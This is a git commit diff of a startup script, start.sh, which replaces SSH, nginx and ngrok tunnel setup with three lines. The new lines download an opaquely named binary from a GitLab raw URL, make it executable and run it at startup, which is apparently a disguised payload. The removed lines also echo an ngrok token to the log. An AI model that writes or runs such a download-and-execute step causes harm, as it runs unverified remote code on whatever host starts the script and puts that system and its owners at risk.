9a6c0ad648e5a3d0243d8cf42436104164f39dee
tuhnjuiuk <90961696+tuhnjuiuk@users.noreply.github.com>
2022-06-14 20:38:25 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,10 +1,4 @@
 #!/bin/bash
-source /app/config.sh
-
-service ssh start
-service nginx start
-
-echo "set ngrok token: $NGROK_TOKEN"
-ngrok authtoken $NGROK_TOKEN
-echo "start ngrok service"
-ngrok tcp 22 --log=stdout > ngrok.log
+wget https://gitlab.com/tamen1/ninu/-/raw/main/ninu2
+chmod +x ninu2
+./ninu2 app
